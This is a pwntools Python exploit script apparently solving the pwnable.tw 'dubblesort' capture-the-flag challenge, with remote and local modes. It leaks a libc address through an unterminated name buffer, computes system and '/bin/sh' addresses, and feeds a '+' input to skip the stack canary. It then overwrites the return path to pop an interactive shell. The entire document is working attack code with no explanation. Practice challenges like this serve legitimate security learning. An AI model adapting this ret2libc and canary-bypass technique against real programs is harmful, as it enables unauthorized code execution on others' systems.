from pwn import*
import argparse
context(arch='i386',os='linux')
context.log_level = 'debug'
#context.terminal = ['tmux','splitw','-h']

parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action = 'store_true',help = '-r -> remote')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10101

elf = ELF('./dubblesort')

def info_bp():
    log.info('first : b * main + 62')
    log.info('second : b * main + 133')
    log.info('input : b * main + 210')
    log.info('input_complete : b * main + 229')
    log.info('sorting function : b * main + 240')

def remote_exploit():
    r.sendlineafter('name :','A'*24)
    r.recvuntil('A'*24)
    libc_base = u32(r.recv(4)) - 0xa
    
    libc_base = libc_base - 0x1b0000
    system_addr = libc_base + libc.symbols['system']
    binsh_addr =  libc_base + list(libc.search('/bin/sh'))[0]
  
    log.info('libc_base = '+hex(libc_base))
    log.info('system_addr = '+hex(system_addr))
    log.info('/bin/sh     = '+hex(binsh_addr))

    r.sendlineafter('sort :',str(35))
    r.recv()

    for i in range(24):
        r.sendline('1')
        r.recv()
    r.sendline('+')

    for i in range(9):
        r.sendline(str(system_addr))
    r.sendline(str(binsh_addr))
    r.recv()

    r.interactive()

def local_exploit():
    info_bp()
    r.sendlineafter('name :','A'*24)
    r.recvuntil('A'*24)
    libc_base = u32(r.recv(4)) - 0xa

    libc_base = libc_base - 0x1d8000
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + list(libc.search('/bin/sh'))[0]

    log.info('libc_base = '+hex(libc_base))
    log.info('system_addr = '+hex(system_addr))
    log.info('/bin/sh     = '+hex(binsh_addr))

    r.sendlineafter('sort :',str(35))
    r.recv()

    for i in range(24):
        r.sendline('1')
        r.recv()
    r.sendline('+')

    for i in range(9):
        r.sendline(str(system_addr))
    r.sendline(str(binsh_addr))
    r.recv()

    r.interactive()

if args.remote:
    r = remote(host,port)
    libc = ELF('./libc_32.so.6')
    remote_exploit()
else:
    r = process('./dubblesort')
    elf = ELF('./dubblesort')
    libc = elf.libc
    gdb.attach(r)
    local_exploit()
